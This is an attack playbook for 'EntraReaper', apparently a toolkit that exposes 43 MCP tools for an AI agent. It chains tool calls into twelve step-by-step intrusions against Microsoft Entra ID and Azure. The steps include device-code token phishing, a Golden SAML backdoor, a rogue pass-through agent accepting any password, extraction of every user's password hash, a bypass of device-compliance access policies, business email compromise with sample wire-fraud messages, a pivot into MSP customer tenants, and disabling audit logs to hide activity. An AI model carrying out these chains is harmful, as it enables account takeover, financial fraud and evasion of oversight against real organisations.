# EntraReaper — Attack Scenarios

Chains the 43 MCP tools into real-world attack sequences.
Each scenario maps to MITRE ATT&CK with OPSEC ratings.

---

## Scenario 1: Outsider-to-Insider (Zero to Token)

**Difficulty:** Easy | **OPSEC:** Silent to Low | **Auth:** None initially
**MITRE:** T1589 - T1589.002 - T1566.002 - T1078.004

```
Step 1: recon_tenant(domain="target.com")
        Get tenant ID, federation type, auth method, SSO status
        OPSEC: Silent

Step 2: recon_domains(domain="target.com")
        Discover all registered domains (shadow IT, acquisitions)
        OPSEC: Silent

Step 3: recon_dns(domain="target.com")
        Map endpoints, federation URLs, MX records
        OPSEC: Silent

Step 4: recon_users(domain="target.com",
                    usernames=["admin","ceo","cfo","hr","it","helpdesk"],
                    method="normal")
        Validate which users exist (no lockout, no logs)
        OPSEC: Low

Step 5: cred_device_code(resource="graph",
                         client_id="d3590ed6-52b3-4102-aeff-aad2292ab01c",
                         save_as="graph")
        Send device code to validated user, capture token
        OPSEC: Low (uses MS Office client ID)

Step 6: cred_token_decode(token_alias="graph")
        Verify captured token: UPN, roles, scopes, expiry
```

**Decision point:** If token has admin roles go to Scenario 4. If regular user go to Scenario 2.

---

## Scenario 2: Insider Reconnaissance (Map the Tenant)

**Difficulty:** Easy | **OPSEC:** Medium | **Auth:** Any valid token
**MITRE:** T1087.004 - T1518.001 - T1069.003

```
Step 1: recon_insider(token_alias="graph", scope="full")
        Dump all users, groups, apps, roles, domains
        OPSEC: Medium

Step 2: recon_ca_policies(token_alias="graph")
        Dump Conditional Access policies, find bypass opportunities
        Look for: excluded users/groups, legacy auth allowed,
          device-only policies without MFA, location-based gaps
        OPSEC: Medium

Step 3: recon_sync_config(token_alias="graph")
        Check PHS/PTA/SSO config, identify hybrid attack paths
        If PTA enabled --> Scenario 5 (Rogue PTA Agent)
        If SSO enabled --> Scenario 7 (Silver Ticket)
        If PHS enabled --> Scenario 6 (NT Hash Extraction)
        OPSEC: Medium

Step 4: cred_mfa_read(token_alias="graph", user="admin@target.com")
        Check MFA methods: SMS (SIM swap), app (persistence target)
        OPSEC: Medium

Step 5: raw_invoke(cmdlet="Get-AADIntDynamicAbusableGroups",
                   token_alias="graph")
        Find groups with user-modifiable dynamic membership rules
        OPSEC: Medium
```

**Key outputs:** CA policy gaps, hybrid config, admin accounts, abusable groups.

---

## Scenario 3: Golden SAML, Persistent Backdoor

**Difficulty:** Hard | **OPSEC:** LOUD | **Auth:** Global Admin
**MITRE:** T1484.002 - T1606.002 - T1078.004 - T1114.002

```
Step 1: opsec_check(tool_name="persist_federation")
        Review detection risk BEFORE proceeding

Step 2: persist_federation(token_alias="admin",
                           domain="target.com",
                           action="detect")
        Check if any backdoors already exist

Step 3: persist_federation(token_alias="admin",
                           domain="target.com",
                           action="install")
        Convert federated domain to backdoor
        Saves signing certificate locally
        OPSEC: LOUD, federation change audit logged

Step 4: persist_federation(token_alias="admin",
                           domain="target.com",
                           action="list_users")
        Get ImmutableIDs for SAML token forging

Step 5: persist_saml_forge(immutable_id="<ImmutableID>",
                           issuer_uri="<backdoor_issuer>",
                           cert_path="/path/to/backdoor.pfx")
        Forge SAML token for ANY user, no password needed

Step 6: cred_token(resource="exo", method="interactive", save_as="victim_exo")
        Use forged SAML to get Exchange token

Step 7: collect_email(token_alias="victim_exo")
        Access victim's mailbox
```

**Persistence:** Backdoor survives password resets, MFA changes, admin removals.
**Detection:** Federation setting changes in Entra ID audit logs.

---

## Scenario 4: Global Admin Escalation Chain

**Difficulty:** Medium | **OPSEC:** HIGH | **Auth:** Global Admin token
**MITRE:** T1548 - T1098.003 - T1580 - T1021.007

```
Step 1: privesc_azure_admin(token_alias="admin")
        Self-elevate to Azure User Access Administrator
        Now controls ALL Azure subscriptions
        OPSEC: HIGH

Step 2: azure_enum(token_alias="azure", scope="all")
        Discover subscriptions, resource groups, VMs

Step 3: privesc_role_assign(token_alias="azure",
                            target_user="<attacker_objectid>",
                            role="Owner",
                            scope="/subscriptions/<sub_id>")
        Grant Owner on target subscription

Step 4: move_vm_exec(token_alias="azure",
                     vm_name="prod-dc-01",
                     resource_group="infrastructure",
                     subscription="<sub_id>",
                     script_content="whoami; ipconfig /all")
        Run commands on Azure VMs
        OPSEC: HIGH

Step 5: evade_audit_logs(token_alias="admin", action="status")
        Check if UAL is enabled (know your exposure)
```

---

## Scenario 5: Rogue PTA Agent, Accept Any Password

**Difficulty:** Hard | **OPSEC:** LOUD | **Auth:** Global Admin + PTA enabled
**MITRE:** T1556.007

```
Step 1: recon_sync_config(token_alias="admin")
        Verify PTA is enabled (SyncFeatures.PassthroughAuthentication = True)

Step 2: opsec_check(tool_name="persist_pta_agent")
        CRITICAL detection risk, review before proceeding

Step 3: cred_token(resource="pta", save_as="pta_token")
        Get token for PTA service

Step 4: persist_pta_agent(token_alias="pta_token")
        Register rogue PTA agent
        ALL future password validations route through this agent
        Agent can accept ANY password for ANY user

Step 5: cred_token(resource="graph",
                   method="credentials",
                   username="ceo@target.com",
                   password="anything",
                   save_as="ceo")
        Login as any user with any password
```

**Impact:** Complete authentication bypass for all cloud users.
**Detection:** New PTA agent registration in Entra ID audit logs.

---

## Scenario 6: Cloud DCSync, NT Hash Extraction

**Difficulty:** Hard | **OPSEC:** HIGH | **Auth:** App with Directory.Read.All + cert
**MITRE:** T1003.006

```
Step 1: cred_token(resource="graph",
                   method="certificate",
                   tenant="target.com",
                   save_as="dcsync")
        Authenticate as app with Directory.Read.All
        Requires: app registration + certificate consent

Step 2: cred_nthash(token_alias="dcsync")
        Extract ALL user NT hashes from Azure AD via DCaaS
        Equivalent to DCSync but from the cloud

Step 3: [OFFLINE] Crack hashes with hashcat/john
        mode 1000 for NTLM
        Use with pass-the-hash or credential stuffing
```

**Impact:** All cloud user password hashes for offline cracking.
**Detection:** App consent for high-privilege permissions, certificate auth patterns.

---

## Scenario 7: Seamless SSO Silver Ticket

**Difficulty:** Medium | **OPSEC:** Medium | **Auth:** AZUREADSSOACC$ hash from on-prem
**MITRE:** T1550.003 - T1528

```
Step 1: recon_sync_config(token_alias="graph")
        Verify Desktop SSO Enabled = True

Step 2: [ON-PREM] Extract AZUREADSSOACC$ computer account NT hash

Step 3: kerberos_ticket(sid="S-1-5-21-...-1234",
                        upn="admin@target.com",
                        password_hash="<AZUREADSSOACC_hash>")
        Create Silver Ticket for any user
        Ticket cached as "kerberos_sso"

Step 4: cred_token(resource="graph", method="interactive", save_as="admin")
        Exchange Kerberos ticket for cloud access token
        Bypasses MFA (SSO is pre-authenticated)
```

**Impact:** Impersonate any user, bypass MFA via Seamless SSO.
**Detection:** Anomalous Kerberos ticket patterns, SSO from unexpected IPs.

---

## Scenario 8: Device Registration + CA Bypass

**Difficulty:** Medium | **OPSEC:** Medium | **Auth:** Any user token
**MITRE:** T1098.005 - T1550.001

```
Step 1: recon_ca_policies(token_alias="graph")
        Look for policies requiring "compliant device" or "Hybrid AD joined"

Step 2: cred_token(resource="aad_join", save_as="join_token")
        Get device join token

Step 3: persist_device(token_alias="join_token",
                       device_name="DESKTOP-A1B2C3D",
                       os_version="10.0.19045.2006",
                       join_type="aad")
        Register rogue device, get device certificate

Step 4: cred_prt_extract(token_alias="join_token", prt_method="token")
        Create PRT from device certificate
        PRT satisfies "compliant device" CA policies

Step 5: impact_config(token_alias="intune",
                      action="spoof_compliance",
                      params_dict={"DeviceId": "<device_id>"})
        Mark device as compliant in Intune
        Now bypasses ALL device-based CA policies

Step 6: cred_token(resource="graph", save_as="ca_bypass")
        Authenticate with PRT, CA policies bypassed
```

---

## Scenario 9: BEC, Mailbox Takeover and Lateral Phishing

**Difficulty:** Easy | **OPSEC:** Medium | **Auth:** Any user token
**MITRE:** T1534 - T1114.002 - T1530

```
Step 1: cred_token(resource="exo", save_as="exo")
        Get Exchange Online token (via device code or stolen creds)

Step 2: collect_email(token_alias="exo")
        Open OWA as victim, read email, find targets

Step 3: cred_token(resource="teams", save_as="teams")
        Get Teams token

Step 4: collect_teams(token_alias="teams", action="messages")
        Read Teams messages, find sensitive conversations

Step 5: move_messaging(token_alias="teams",
                       target="finance@target.com",
                       message="Please update the wire transfer details...",
                       platform="teams")
        Send internal phishing as compromised user

Step 6: move_messaging(token_alias="exo",
                       target="vendor@external.com",
                       message="Updated bank details attached",
                       subject="RE: Invoice #4521",
                       platform="outlook")
        BEC: redirect payments via email

Step 7: collect_onedrive(token_alias="onedrive", action="list")
        Browse victim's OneDrive for sensitive files

Step 8: collect_sharepoint(token_alias="spo",
                           site_url="https://target.sharepoint.com/sites/finance",
                           action="download",
                           file_path="/Shared Documents/Budget_2026.xlsx")
        Exfiltrate from SharePoint
```

---

## Scenario 10: Partner Tenant Pivot (MSP Attack)

**Difficulty:** Medium | **OPSEC:** Medium | **Auth:** MSP partner token
**MITRE:** T1199 - T1078.004

```
Step 1: cred_token(resource="partner", save_as="partner")
        Authenticate to MS Partner Center

Step 2: move_partner_pivot(token_alias="partner", action="list")
        List all customer tenants managed by this MSP
        Returns: tenant IDs, domains, contract types

Step 3: move_partner_pivot(token_alias="partner",
                           action="request",
                           target_tenant="<customer_tenant_id>")
        Request delegated admin access to customer tenant

Step 4: cred_token(resource="graph",
                   tenant="<customer_tenant_id>",
                   save_as="customer_graph")
        Get token for customer tenant via GDAP

Step 5: recon_insider(token_alias="customer_graph", scope="full")
        Full recon of customer tenant as delegated admin
        Repeat for each customer tenant
```

**Impact:** Compromise one MSP, access all customer tenants.
**Real-world:** SolarWinds, Kaseya-style supply chain attacks.

---

## Scenario 11: MFA Persistence, Register Rogue Authenticator

**Difficulty:** Easy | **OPSEC:** Medium | **Auth:** User token
**MITRE:** T1098.005 - T1111

```
Step 1: cred_mfa_read(token_alias="admin", user="target@target.com")
        Check current MFA methods

Step 2: persist_mfa_app(token_alias="graph", user="target@target.com")
        Register AADInternals as authenticator app
        Returns OTP secret for generating TOTP codes

Step 3: [ONGOING] Generate TOTP codes with the secret
        raw_invoke(cmdlet="New-AADIntOTP",
                   parameters={"SecretKey": "<otp_secret>"})
        Produces valid MFA codes without victim's phone
```

**Persistence:** Survives password resets. Only cleared if victim manually removes the app.

---

## Scenario 12: Defense Evasion, Cover Tracks

**Difficulty:** Easy | **OPSEC:** LOUD (ironically) | **Auth:** Admin
**MITRE:** T1562.008 - T1556

```
Step 1: evade_audit_logs(token_alias="admin", action="status")
        Check if Unified Audit Log is enabled

Step 2: evade_audit_logs(token_alias="admin", action="disable")
        Disable audit logging (the disable event itself IS logged)
        Window: ~24h before logs stop propagating

Step 3: evade_policy_weaken(token_alias="admin",
                            target="guest_access",
                            action="weaken")
        Make tenant more permissive for lateral movement

Step 4: [PERFORM ATTACK ACTIONS HERE]

Step 5: evade_audit_logs(token_alias="admin", action="enable")
        Re-enable logging after completing objectives

Step 6: evade_policy_weaken(token_alias="admin",
                            target="guest_access",
                            action="status")
        Verify settings restored
```

**Warning:** Disabling UAL creates a log gap that investigators WILL notice.

---

## Scenario Selection Matrix

| Scenario | Entry Point | Privilege Needed | OPSEC | Impact |
|----------|-------------|-----------------|-------|--------|
| 1. Outsider Recon | Domain name | None | Silent | Intelligence |
| 2. Insider Recon | Any token | Regular user | Medium | Mapping |
| 3. Golden SAML | Global Admin | Global Admin | LOUD | Persistent backdoor |
| 4. Azure Escalation | Global Admin | Global Admin | HIGH | Full Azure control |
| 5. Rogue PTA | Global Admin + PTA | Global Admin | LOUD | Auth bypass all users |
| 6. Cloud DCSync | App + cert | App admin | HIGH | All password hashes |
| 7. SSO Silver Ticket | On-prem access | Domain access | Medium | Impersonate any user |
| 8. Device CA Bypass | Any token | Regular user | Medium | CA policy bypass |
| 9. BEC | Any token | Regular user | Medium | Financial fraud, exfil |
| 10. MSP Pivot | Partner token | Partner admin | Medium | All customer tenants |
| 11. MFA Persistence | User token | Regular user | Medium | Persistent MFA bypass |
| 12. Cover Tracks | Admin token | Admin | LOUD | Evidence destruction |
